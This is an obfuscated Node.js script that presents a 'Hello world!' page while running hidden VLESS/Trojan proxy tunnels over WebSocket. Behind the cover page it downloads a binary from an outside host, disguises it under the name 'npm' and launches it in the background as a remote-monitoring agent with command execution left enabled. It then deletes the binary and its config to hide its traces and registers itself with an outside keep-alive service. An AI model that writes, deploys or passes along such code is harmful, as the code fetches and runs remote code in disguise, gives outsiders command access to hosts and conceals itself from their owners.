function _0x32b7(_0x4ced16,_0x288a5c){const _0xfb6b2a=_0xfb6b();return _0x32b7=function(_0x32b7ff,_0x43eb8b){_0x32b7ff=_0x32b7ff-0x85;let _0xc0b403=_0xfb6b2a[_0x32b7ff];return _0xc0b403;},_0x32b7(_0x4ced16,_0x288a5c);}const _0x278f36=_0x32b7;(function(_0x5d7dad,_0x3638e4){const _0x38c61c=_0x32b7,_0x5584dd=_0x5d7dad();while(!![]){try{const _0xb8a1a9=parseInt(_0x38c61c(0xc7))/0x1*(-parseInt(_0x38c61c(0xff))/0x2)+-parseInt(_0x38c61c(0xee))/0x3*(parseInt(_0x38c61c(0xfd))/0x4)+parseInt(_0x38c61c(0xc5))/0x5*(-parseInt(_0x38c61c(0x9d))/0x6)+parseInt(_0x38c61c(0xa8))/0x7*(parseInt(_0x38c61c(0xda))/0x8)+parseInt(_0x38c61c(0xd1))/0x9+parseInt(_0x38c61c(0xa0))/0xa+-parseInt(_0x38c61c(0xbd))/0xb*(parseInt(_0x38c61c(0xfe))/0xc);if(_0xb8a1a9===_0x3638e4)break;else _0x5584dd['push'](_0x5584dd['shift']());}catch(_0x4c6e1b){_0x5584dd['push'](_0x5584dd['shift']());}}}(_0xfb6b,0xb750c));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x278f36(0x8b)),net=require(_0x278f36(0xe2)),path=require(_0x278f36(0xaf)),crypto=require(_0x278f36(0xd9)),{Buffer}=require('buffer'),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x278f36(0xa1)]||_0x278f36(0xcb),NEZHA_SERVER=process['env'][_0x278f36(0xb9)]||'',NEZHA_PORT=process[_0x278f36(0xbc)][_0x278f36(0x102)]||'',NEZHA_KEY=process[_0x278f36(0xbc)][_0x278f36(0xb4)]||'',DOMAIN=process['env'][_0x278f36(0x88)]||_0x278f36(0x98),AUTO_ACCESS=process['env'][_0x278f36(0xf6)]||!![],WSPATH=process['env'][_0x278f36(0xce)]||UUID[_0x278f36(0x8f)](0x0,0x8),SUB_PATH=process[_0x278f36(0xbc)][_0x278f36(0xbe)]||_0x278f36(0xf1),NAME=process[_0x278f36(0xbc)][_0x278f36(0xc3)]||_0x278f36(0x96),PORT=process['env'][_0x278f36(0xd7)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x9914cf=_0x278f36;try{const _0x1c5176=await axios[_0x9914cf(0x9b)](_0x9914cf(0xe5)),_0x14631b=_0x1c5176[_0x9914cf(0x9c)];ISP=(_0x14631b[_0x9914cf(0xc8)]+'-'+_0x14631b[_0x9914cf(0xc2)])[_0x9914cf(0xd6)](/ /g,'_');}catch(_0x36f952){ISP=_0x9914cf(0xe3);}};function _0xfb6b(){const _0x548a63=['Hello\x20world!','2053','trojan://','573EkaNLG','arch','npm','sub','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','from','https://oooo.serv00.net/add-url','pipe','AUTO_ACCESS','map','readUInt16BE','443','connect','Server\x20is\x20running\x20on\x20port\x20','error:\x20','5772OswAYm','12GzOXxW','125162AZPwQh','8443','&path=%2F','NEZHA_PORT','Failed\x20to\x20resolve\x20','post','length','toString','substr','text/plain','chmod\x20+x\x20npm','Status','DOMAIN','config.yaml','2096','axios','url','\x20with\x20all\x20DNS\x20servers','Not\x20Found\x0a','slice','npm\x20is\x20already\x20running,\x20skip\x20running...','https://dns.google/resolve?name=','utf8','connection','write','pop','Hug','https://amd64.ssss.nyc.mn/v1','1234.abc.com','join','hex','get','data','1123878bYQcoA','find','every','13859620yIVEPr','UUID','then','createWriteStream','log','https://amd64.ssss.nyc.mn/agent','npm\x20is\x20running','/bin/bash','224sRrTaH','unlink','&fp=chrome&type=ws&host=','catch','error','close','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','path','Server','test','once','https://arm64.ssss.nyc.mn/v1','NEZHA_KEY','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','stream','arm','NEZHA_SERVER','text/html',':443?encryption=none&security=tls&sni=','env','11540925kNmXvS','SUB_PATH','Answer','\x20-p\x20','npm\x20running\x20error:','asOrganization','NAME','vless://','40sVTQQw','includes','1MJlmNp','country','readFile','2087','331aca25-1504-4c39-9410-d7ac58e0d566','https://arm64.ssss.nyc.mn/agent','false','WSPATH','writeFileSync','writeHead','9367947YtuFmT','split','concat','createServer','arm64','replace','PORT','--tls','crypto','302472MMVGAL','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','send','end','true','application/json','listen','reduce','net','Unknown','Automatic\x20Access\x20Task\x20added\x20successfully','https://speed.cloudflare.com/meta','utf-8','message','readUInt8','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',':443?security=tls&sni='];_0xfb6b=function(){return _0x548a63;};return _0xfb6b();}GetISP();const httpServer=http[_0x278f36(0xd4)]((_0x56942c,_0x161b33)=>{const _0x2aea42=_0x278f36;if(_0x56942c['url']==='/'){const _0x603adb=path[_0x2aea42(0x99)](__dirname,'index.html');fs[_0x2aea42(0xc9)](_0x603adb,_0x2aea42(0x92),(_0x1d2ad1,_0x439328)=>{const _0x17f6d9=_0x2aea42;if(_0x1d2ad1){_0x161b33[_0x17f6d9(0xd0)](0xc8,{'Content-Type':_0x17f6d9(0xba)}),_0x161b33[_0x17f6d9(0xdd)](_0x17f6d9(0xeb));return;}_0x161b33[_0x17f6d9(0xd0)](0xc8,{'Content-Type':_0x17f6d9(0xba)}),_0x161b33[_0x17f6d9(0xdd)](_0x439328);});return;}else{if(_0x56942c[_0x2aea42(0x8c)]==='/'+SUB_PATH){const _0x3b78f3=_0x2aea42(0xc4)+UUID+'@'+DOMAIN+_0x2aea42(0xbb)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x32ebbb=_0x2aea42(0xed)+UUID+'@'+DOMAIN+_0x2aea42(0xea)+DOMAIN+_0x2aea42(0xaa)+DOMAIN+_0x2aea42(0x101)+WSPATH+'#'+NAME+'-'+ISP,_0x2c9e08=_0x3b78f3+'\x0a'+_0x32ebbb,_0x4c2adf=Buffer[_0x2aea42(0xf3)](_0x2c9e08)[_0x2aea42(0x106)]('base64');_0x161b33[_0x2aea42(0xd0)](0xc8,{'Content-Type':_0x2aea42(0x85)}),_0x161b33[_0x2aea42(0xdd)](_0x4c2adf+'\x0a');}else _0x161b33[_0x2aea42(0xd0)](0x194,{'Content-Type':_0x2aea42(0x85)}),_0x161b33['end'](_0x2aea42(0x8e));}}),wss=new WebSocket[(_0x278f36(0xb0))]({'server':httpServer}),uuid=UUID[_0x278f36(0xd6)](/-/g,''),DNS_SERVERS=['8.8.4.4','1.1.1.1'];function resolveHost(_0x3b313e){return new Promise((_0x210723,_0x2067c9)=>{const _0x48ee5b=_0x32b7;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x48ee5b(0xb1)](_0x3b313e)){_0x210723(_0x3b313e);return;}let _0xb2e06e=0x0;function _0x2f0b6b(){const _0x455f0d=_0x48ee5b;if(_0xb2e06e>=DNS_SERVERS[_0x455f0d(0x105)]){_0x2067c9(new Error(_0x455f0d(0x103)+_0x3b313e+_0x455f0d(0x8d)));return;}const _0x476883=DNS_SERVERS[_0xb2e06e];_0xb2e06e++;const _0xc6014c=_0x455f0d(0x91)+encodeURIComponent(_0x3b313e)+'&type=A';axios['get'](_0xc6014c,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x455f0d(0xa2)](_0x33cbdf=>{const _0x471979=_0x455f0d,_0x5b9705=_0x33cbdf[_0x471979(0x9c)];if(_0x5b9705[_0x471979(0x87)]===0x0&&_0x5b9705[_0x471979(0xbf)]&&_0x5b9705['Answer'][_0x471979(0x105)]>0x0){const _0xaa0dc1=_0x5b9705[_0x471979(0xbf)][_0x471979(0x9e)](_0x3f7fdd=>_0x3f7fdd['type']===0x1);if(_0xaa0dc1){_0x210723(_0xaa0dc1['data']);return;}}_0x2f0b6b();})[_0x455f0d(0xab)](_0x5bc2d8=>{_0x2f0b6b();});}_0x2f0b6b();});}function handleVlessConnection(_0x2b2037,_0x58e98f){const _0x29e223=_0x278f36,[_0xd53058]=_0x58e98f,_0x304ebf=_0x58e98f[_0x29e223(0x8f)](0x1,0x11);if(!_0x304ebf[_0x29e223(0x9f)]((_0x1358a6,_0x41c337)=>_0x1358a6==parseInt(uuid[_0x29e223(0x107)](_0x41c337*0x2,0x2),0x10)))return![];let _0x5b2a98=_0x58e98f[_0x29e223(0x8f)](0x11,0x12)[_0x29e223(0xe8)]()+0x13;const _0x4043a4=_0x58e98f[_0x29e223(0x8f)](_0x5b2a98,_0x5b2a98+=0x2)[_0x29e223(0xf8)](0x0),_0x1b1077=_0x58e98f['slice'](_0x5b2a98,_0x5b2a98+=0x1)[_0x29e223(0xe8)](),_0x33063c=_0x1b1077==0x1?_0x58e98f[_0x29e223(0x8f)](_0x5b2a98,_0x5b2a98+=0x4)[_0x29e223(0x99)]('.'):_0x1b1077==0x2?new TextDecoder()['decode'](_0x58e98f['slice'](_0x5b2a98+0x1,_0x5b2a98+=0x1+_0x58e98f[_0x29e223(0x8f)](_0x5b2a98,_0x5b2a98+0x1)[_0x29e223(0xe8)]())):_0x1b1077==0x3?_0x58e98f[_0x29e223(0x8f)](_0x5b2a98,_0x5b2a98+=0x10)[_0x29e223(0xe1)]((_0x28c574,_0x2e1a4b,_0x28fd65,_0x3c1474)=>_0x28fd65%0x2?_0x28c574[_0x29e223(0xd3)](_0x3c1474[_0x29e223(0x8f)](_0x28fd65-0x1,_0x28fd65+0x1)):_0x28c574,[])['map'](_0x504d00=>_0x504d00[_0x29e223(0xf8)](0x0)[_0x29e223(0x106)](0x10))['join'](':'):'';_0x2b2037[_0x29e223(0xdc)](new Uint8Array([_0xd53058,0x0]));const _0xe1b927=createWebSocketStream(_0x2b2037);return resolveHost(_0x33063c)[_0x29e223(0xa2)](_0x3660b9=>{const _0x228091=_0x29e223;net[_0x228091(0xfa)]({'host':_0x3660b9,'port':_0x4043a4},function(){const _0x40b2ae=_0x228091;this[_0x40b2ae(0x94)](_0x58e98f[_0x40b2ae(0x8f)](_0x5b2a98)),_0xe1b927['on'](_0x40b2ae(0xac),()=>{})[_0x40b2ae(0xf5)](this)['on'](_0x40b2ae(0xac),()=>{})[_0x40b2ae(0xf5)](_0xe1b927);})['on']('error',()=>{});})[_0x29e223(0xab)](_0x20f580=>{const _0x22407e=_0x29e223;net[_0x22407e(0xfa)]({'host':_0x33063c,'port':_0x4043a4},function(){const _0x15d46b=_0x22407e;this['write'](_0x58e98f['slice'](_0x5b2a98)),_0xe1b927['on']('error',()=>{})[_0x15d46b(0xf5)](this)['on'](_0x15d46b(0xac),()=>{})['pipe'](_0xe1b927);})['on'](_0x22407e(0xac),()=>{});}),!![];}function handleTrojanConnection(_0x2e76c2,_0x3427fd){const _0x5acd89=_0x278f36;try{if(_0x3427fd[_0x5acd89(0x105)]<0x3a)return![];const _0x28c729=_0x3427fd[_0x5acd89(0x8f)](0x0,0x38)['toString'](),_0x42ba8f=[UUID];let _0x205f4d=null;for(const _0x3c8ec9 of _0x42ba8f){const _0x1e37a6=crypto['createHash']('sha224')['update'](_0x3c8ec9)['digest'](_0x5acd89(0x9a));if(_0x1e37a6===_0x28c729){_0x205f4d=_0x3c8ec9;break;}}if(!_0x205f4d)return![];let _0x28b72f=0x38;_0x3427fd[_0x28b72f]===0xd&&_0x3427fd[_0x28b72f+0x1]===0xa&&(_0x28b72f+=0x2);const _0x179ce0=_0x3427fd[_0x28b72f];if(_0x179ce0!==0x1)return![];_0x28b72f+=0x1;const _0xe455b4=_0x3427fd[_0x28b72f];_0x28b72f+=0x1;let _0x32fa34,_0x57645f;if(_0xe455b4===0x1)_0x32fa34=_0x3427fd['slice'](_0x28b72f,_0x28b72f+0x4)[_0x5acd89(0x99)]('.'),_0x28b72f+=0x4;else{if(_0xe455b4===0x3){const _0x5a0264=_0x3427fd[_0x28b72f];_0x28b72f+=0x1,_0x32fa34=_0x3427fd[_0x5acd89(0x8f)](_0x28b72f,_0x28b72f+_0x5a0264)['toString'](),_0x28b72f+=_0x5a0264;}else{if(_0xe455b4===0x4)_0x32fa34=_0x3427fd[_0x5acd89(0x8f)](_0x28b72f,_0x28b72f+0x10)[_0x5acd89(0xe1)]((_0x5a07a1,_0x84ff68,_0x1d464d,_0x36e7f9)=>_0x1d464d%0x2?_0x5a07a1[_0x5acd89(0xd3)](_0x36e7f9[_0x5acd89(0x8f)](_0x1d464d-0x1,_0x1d464d+0x1)):_0x5a07a1,[])[_0x5acd89(0xf7)](_0x2e59e6=>_0x2e59e6[_0x5acd89(0xf8)](0x0)[_0x5acd89(0x106)](0x10))[_0x5acd89(0x99)](':'),_0x28b72f+=0x10;else return![];}}_0x57645f=_0x3427fd['readUInt16BE'](_0x28b72f),_0x28b72f+=0x2;_0x28b72f<_0x3427fd[_0x5acd89(0x105)]&&_0x3427fd[_0x28b72f]===0xd&&_0x3427fd[_0x28b72f+0x1]===0xa&&(_0x28b72f+=0x2);const _0x33a74a=createWebSocketStream(_0x2e76c2);return resolveHost(_0x32fa34)['then'](_0x20f86e=>{const _0x1fdb74=_0x5acd89;net['connect']({'host':_0x20f86e,'port':_0x57645f},function(){const _0x198b4e=_0x32b7;_0x28b72f<_0x3427fd[_0x198b4e(0x105)]&&this['write'](_0x3427fd[_0x198b4e(0x8f)](_0x28b72f)),_0x33a74a['on'](_0x198b4e(0xac),()=>{})[_0x198b4e(0xf5)](this)['on'](_0x198b4e(0xac),()=>{})[_0x198b4e(0xf5)](_0x33a74a);})['on'](_0x1fdb74(0xac),()=>{});})[_0x5acd89(0xab)](_0x504e14=>{const _0x15f0e4=_0x5acd89;net['connect']({'host':_0x32fa34,'port':_0x57645f},function(){const _0x438f11=_0x32b7;_0x28b72f<_0x3427fd[_0x438f11(0x105)]&&this[_0x438f11(0x94)](_0x3427fd[_0x438f11(0x8f)](_0x28b72f)),_0x33a74a['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})[_0x438f11(0xf5)](_0x33a74a);})['on'](_0x15f0e4(0xac),()=>{});}),!![];}catch(_0x1b1311){return![];}}wss['on'](_0x278f36(0x93),(_0x5f5237,_0x1b282d)=>{const _0x2166b3=_0x278f36,_0x741539=_0x1b282d[_0x2166b3(0x8c)]||'';_0x5f5237[_0x2166b3(0xb2)](_0x2166b3(0xe7),_0x40873e=>{const _0xda718c=_0x2166b3;if(_0x40873e[_0xda718c(0x105)]>0x11&&_0x40873e[0x0]===0x0){const _0x335e32=_0x40873e['slice'](0x1,0x11),_0xa936b8=_0x335e32[_0xda718c(0x9f)]((_0x2d03c0,_0x17acfb)=>_0x2d03c0==parseInt(uuid[_0xda718c(0x107)](_0x17acfb*0x2,0x2),0x10));if(_0xa936b8){!handleVlessConnection(_0x5f5237,_0x40873e)&&_0x5f5237[_0xda718c(0xad)]();return;}}!handleTrojanConnection(_0x5f5237,_0x40873e)&&_0x5f5237[_0xda718c(0xad)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x3b75a0=_0x278f36,_0xe46293=os[_0x3b75a0(0xef)]();return _0xe46293===_0x3b75a0(0xb8)||_0xe46293===_0x3b75a0(0xd5)||_0xe46293==='aarch64'?!NEZHA_PORT?_0x3b75a0(0xb3):_0x3b75a0(0xcc):!NEZHA_PORT?_0x3b75a0(0x97):_0x3b75a0(0xa5);},downloadFile=async()=>{const _0x4bec2f=_0x278f36;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x4bda5c=getDownloadUrl(),_0x5a9ab9=await axios({'method':_0x4bec2f(0x9b),'url':_0x4bda5c,'responseType':_0x4bec2f(0xb7)}),_0x3d4b65=fs[_0x4bec2f(0xa3)](_0x4bec2f(0xf0));return _0x5a9ab9[_0x4bec2f(0x9c)][_0x4bec2f(0xf5)](_0x3d4b65),new Promise((_0x2392b7,_0x496c41)=>{const _0x3ae5ef=_0x4bec2f;_0x3d4b65['on']('finish',()=>{const _0x58d669=_0x32b7;console['log']('npm\x20download\x20successfully'),exec(_0x58d669(0x86),_0x4e445b=>{if(_0x4e445b)_0x496c41(_0x4e445b);_0x2392b7();});}),_0x3d4b65['on'](_0x3ae5ef(0xac),_0x496c41);});}catch(_0x482d63){throw _0x482d63;}},runnz=async()=>{const _0x44f58c=_0x278f36;try{const _0x175e40=execSync(_0x44f58c(0xe9),{'encoding':_0x44f58c(0xe6)});if(_0x175e40['trim']()!==''){console[_0x44f58c(0xa4)](_0x44f58c(0x90));return;}}catch(_0x5eaf65){}await downloadFile();let _0x516851='',_0x3c27e6=[_0x44f58c(0xf9),_0x44f58c(0x100),_0x44f58c(0x8a),_0x44f58c(0xca),'2083',_0x44f58c(0xec)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x51acdb=_0x3c27e6[_0x44f58c(0xc6)](NEZHA_PORT)?_0x44f58c(0xd8):'';_0x516851='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x44f58c(0xc0)+NEZHA_KEY+'\x20'+_0x51acdb+_0x44f58c(0xf2);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x245f50=NEZHA_SERVER[_0x44f58c(0xc6)](':')?NEZHA_SERVER[_0x44f58c(0xd2)](':')[_0x44f58c(0x95)]():'',_0xbd67f1=_0x3c27e6[_0x44f58c(0xc6)](_0x245f50)?_0x44f58c(0xde):_0x44f58c(0xcd),_0x4c0df3='client_secret:\x20'+NEZHA_KEY+_0x44f58c(0xae)+NEZHA_SERVER+_0x44f58c(0xb6)+_0xbd67f1+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x44f58c(0xcf)](_0x44f58c(0x89),_0x4c0df3);}_0x516851=_0x44f58c(0xb5);}else{console['log'](_0x44f58c(0xdb));return;}}try{exec(_0x516851,{'shell':_0x44f58c(0xa7)},_0xcc0b6c=>{const _0x24f980=_0x44f58c;if(_0xcc0b6c)console[_0x24f980(0xac)](_0x24f980(0xc1),_0xcc0b6c);else console[_0x24f980(0xa4)](_0x24f980(0xa6));});}catch(_0x558795){console[_0x44f58c(0xac)](_0x44f58c(0xfc)+_0x558795);}};async function addAccessTask(){const _0x5ae852=_0x278f36;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x2e0805='https://'+DOMAIN;try{const _0x21e38f=await axios[_0x5ae852(0x104)](_0x5ae852(0xf4),{'url':_0x2e0805},{'headers':{'Content-Type':_0x5ae852(0xdf)}});console[_0x5ae852(0xa4)](_0x5ae852(0xe4));}catch(_0x1470ca){}}const delFiles=()=>{const _0x256af8=_0x278f36;fs[_0x256af8(0xa9)](_0x256af8(0xf0),()=>{}),fs[_0x256af8(0xa9)](_0x256af8(0x89),()=>{});};httpServer[_0x278f36(0xe0)](PORT,()=>{const _0x5764b5=_0x278f36;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x5764b5(0xa4)](_0x5764b5(0xfb)+PORT);});
